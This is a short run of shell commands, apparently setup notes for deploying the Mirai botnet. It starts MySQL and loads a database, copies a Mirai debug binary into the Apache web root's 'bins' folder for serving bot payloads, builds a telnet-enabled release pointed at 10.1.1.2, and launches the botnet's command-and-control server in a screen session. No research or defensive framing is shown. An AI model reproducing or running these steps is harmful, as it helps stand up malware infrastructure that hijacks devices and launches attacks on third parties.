service mysql start
cat /home/tools/db.sql | mysql --user=root --password=root

mv debug/mirai.dbg /var/www/html/bins/
# start apache service
/etc/init.d/apache2 start
cd /home
bash ./build.sh release telnet #(input 10.1.1.2)
cd release
bash ../apache2.sh
screen -S cnc ./cnc #(just ./cnc if another screen isn't necessary)